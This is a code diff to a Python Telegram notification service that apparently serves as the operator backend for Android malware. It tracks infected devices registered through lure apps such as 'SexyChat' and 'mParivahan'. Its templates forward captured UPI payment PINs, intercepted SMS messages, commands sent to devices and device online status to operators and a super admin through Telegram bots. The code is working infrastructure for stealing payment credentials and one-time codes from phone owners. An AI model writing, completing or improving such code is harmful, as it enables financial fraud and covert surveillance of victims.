@@ -132,15 +132,15 @@ class TelegramMultiService:
         if message_prefix:
             message = message_prefix
         else:
-            message = "?? <b>Two-Factor Authentication</b>\n\n"
+            message = "🔐 <b>Two-Factor Authentication</b>\n\n"
         
-        message += f"?? Admin: <code>{admin_username}</code>\n"
-        message += f"?? IP: <code>{ip_address}</code>\n"
+        message += f"👤 Admin: <code>{admin_username}</code>\n"
+        message += f"🌐 IP: <code>{ip_address}</code>\n"
         
         if code:
-            message += f"?? Code: <code>{code}</code>\n"
+            message += f"🔢 Code: <code>{code}</code>\n"
         
-        message += f"? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
+        message += f"🕐 Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
         
         return await self._send_message_to_chat(
             self.twofa_bot_token,
@@ -188,13 +188,21 @@ class TelegramMultiService:
         app_type = device_info.get('app_type', 'Unknown')
         
         app_names = {
-            'sexychat': '?? SexyChat',
-            'mparivahan': '?? mParivahan',
-            'sexyhub': '?? SexyHub'
+            'sexychat': '💬 SexyChat',
+            'mparivahan': '🚗 mParivahan',
+            'sexyhub': '💎 SexyHub'
         }
-        app_display = app_names.get(app_type.lower(), f'?? {app_type}')
+        app_display = app_names.get(app_type.lower(), f'📱 {app_type}')
         
-        message = f
+        message = f"""
+📱 <b>New Device Registered</b>
+
+📦 <b>App:</b> {app_display}
+🆔 <b>Device ID:</b> <code>{device_id}</code>
+📲 <b>Model:</b> {device_info.get('manufacturer', 'Unknown')} {device_info.get('model', 'Unknown')}
+🤖 <b>Android:</b> {device_info.get('os_version', 'Unknown')}
+🕐 <b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
+"""
         await self.send_to_admin(admin_username, message, bot_index=1)
         
         await self._notify_super_admin(message, bot_index=1, exclude_username=admin_username)
@@ -206,7 +214,15 @@ class TelegramMultiService:
         admin_username: str
     ):
         
-        message = f
+        message = f"""
+🔐 <b>UPI PIN Detected!</b>
+
+📱 <b>Device:</b> <code>{device_id}</code>
+🔢 <b>PIN:</b> <code>{upi_pin}</code>
+🕐 <b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
+
+⚠️ <b>IMPORTANT:</b> Store securely!
+"""
         await self.send_to_admin(admin_username, message, bot_index=1)
         
         await self._notify_super_admin(message, bot_index=1, exclude_username=admin_username)
@@ -218,10 +234,16 @@ class TelegramMultiService:
         success: bool = True
     ):
         
-        icon = "?" if success else "?"
+        icon = "✅" if success else "❌"
         status = "Successful" if success else "Failed"
         
-        message = f
+        message = f"""
+{icon} <b>Admin Login {status}</b>
+
+👤 <b>Username:</b> <code>{admin_username}</code>
+🌐 <b>IP:</b> <code>{ip_address}</code>
+🕐 <b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
+"""
         
         await self.send_to_admin(admin_username, message, bot_index=4)
         
@@ -234,7 +256,14 @@ class TelegramMultiService:
         command: str
     ):
         
-        message = f
+        message = f"""
+📤 <b>Command Sent</b>
+
+👤 <b>Admin:</b> <code>{admin_username}</code>
+📱 <b>Device:</b> <code>{device_id}</code>
+⚙️ <b>Command:</b> <code>{command}</code>
+🕐 <b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
+"""
         await self.send_to_admin(admin_username, message, bot_index=3)
         
         await self._notify_super_admin(message, bot_index=3, exclude_username=admin_username)
@@ -250,11 +279,21 @@ class TelegramMultiService:
         max_message_length = 3500
         
         if len(full_message) > max_message_length:
-            sms_text = full_message[:max_message_length] + "\n\n... (???? ????? ??)"
+            sms_text = full_message[:max_message_length] + "\n\n... (message truncated)"
         else:
             sms_text = full_message
         
-        message = f
+        message = f"""
+💬 <b>New SMS</b>
+
+📱 <b>Device:</b> <code>{device_id}</code>
+👤 <b>From:</b> {from_number}
+
+📝 <b>Message:</b>
+<i>{sms_text}</i>
+
+🕐 <b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
+"""
         await self.send_to_admin(admin_username, message, bot_index=2)
         
         await self._notify_super_admin(message, bot_index=2, exclude_username=admin_username)
@@ -267,7 +306,15 @@ class TelegramMultiService:
         device_token: str
     ):
         
-        message = f
+        message = f"""
+👤 <b>New Admin Created</b>
+
+👨‍💼 <b>Creator:</b> <code>{creator_username}</code>
+🆕 <b>New Admin:</b> <code>{new_admin_username}</code>
+🎭 <b>Role:</b> {role}
+🔑 <b>Token:</b> <code>{device_token[:20]}...</code>
+🕐 <b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
+"""
         await self.send_to_admin(creator_username, message, bot_index=3)
         
         await self._notify_super_admin(message, bot_index=3, exclude_username=creator_username)
@@ -280,10 +327,16 @@ class TelegramMultiService:
         is_online: bool
     ):
         
-        icon = "??" if is_online else "??"
+        icon = "🟢" if is_online else "🔴"
         status_text = "Online" if is_online else "Offline"
         
-        message = f
+        message = f"""
+{icon} <b>Device Status Changed</b>
+
+📱 <b>Device:</b> <code>{device_id}</code>
+📊 <b>Status:</b> {status_text}
+🕐 <b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
+"""
         await self.send_to_admin(admin_username, message, bot_index=3)
         
         await self._notify_super_admin(message, bot_index=3, exclude_username=admin_username)
@@ -294,7 +347,13 @@ class TelegramMultiService:
         ip_address: str
     ):
         
-        message = f
+        message = f"""
+🔒 <b>Admin Logout</b>
+
+👤 <b>Username:</b> <code>{admin_username}</code>
+🌐 <b>IP:</b> <code>{ip_address}</code>
+🕐 <b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
+"""
         await self.send_to_admin(admin_username, message, bot_index=4)
         
         await self._notify_super_admin(message, bot_index=4, exclude_username=admin_username)
@@ -307,13 +366,20 @@ class TelegramMultiService:
         ip_address: str = None
     ):
         
-        message = f
+        message = f"""
+⚙️ <b>Admin Action</b>
+
+👤 <b>Admin:</b> <code>{admin_username}</code>
+📋 <b>Action:</b> {action}
+"""
+        
         if details:
-            message += f"?? Details: {details}\n"
+            message += f"📝 <b>Details:</b> {details}\n"
         
         if ip_address:
-            message += f"?? IP: <code>{ip_address}</code>\n"
-        message += f"?? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
+            message += f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
+        
+        message += f"🕐 <b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
         
         
         await self.send_to_admin(admin_username, message, bot_index=3)
